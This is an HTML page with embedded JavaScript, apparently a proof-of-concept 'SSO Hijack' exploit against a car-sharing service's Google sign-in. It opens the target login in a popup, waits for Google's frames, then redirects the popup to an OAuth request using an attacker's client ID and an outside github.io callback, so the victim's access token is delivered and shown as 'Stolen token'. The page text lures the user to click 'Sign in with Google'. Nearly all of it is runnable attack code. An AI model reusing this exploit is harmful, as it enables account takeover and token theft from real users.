<!doctype html>
<html>
<head>
  <meta charset="utf-8">
  <title>SSO Hijack URL</title>
  <script>
  (function(){
    // Read the target from ?target=
    const target = new URLSearchParams(location.search).get('target');
    if (!target) return alert('Missing ?target parameter.');

    // Listen for the token from the child
    window.addEventListener('message', e => {
      if (e.origin !== location.origin) return;
      if (e.data.type === 'got_token') {
        alert('ü•∑ Stolen token:\n' + e.data.token);
      }
    });

    // 1) Open Free2move‚Äôs login
    const popup = window.open(
      target,
      'sso_window',
      'width=600,height=800'
    );

    // 2) Build the attacker OAuth URL
    const ATTACKER_CLIENT_ID = '973721409870-vd46nngkltk55ro9jp509ov1133m5s74.apps.googleusercontent.com';
    const REDIRECT_URI       = 'https://eunoiia.github.io/sso-poc/callback.html';
    const authUrl = 
      'https://accounts.google.com/o/oauth2/v2/auth' +
      '?client_id='    + encodeURIComponent(ATTACKER_CLIENT_ID) +
      '&redirect_uri=' + encodeURIComponent(REDIRECT_URI) +
      '&response_type=token' +
      '&scope=email%20profile' +
      '&prompt=select_account'
    ;

    // 3) Poll for Google‚Äôs frames (‚â•2)
    const tid = setInterval(() => {
      let frames = 0;
      try { frames = popup.frames.length; }
      catch(_) { /* cross-origin until they appear */ }

      if (frames >= 2) {
        clearInterval(tid);
        // hijack the OAuth handshake
        popup.location.replace(authUrl);
      }
    }, 300);
  })();
  </script>
</head>
<body>
  <h1>Launching SSO‚Ä¶</h1>
  <p>If you see a popup, click ‚ÄúSign in with Google‚Äù to proceed.</p>
</body>
</html>
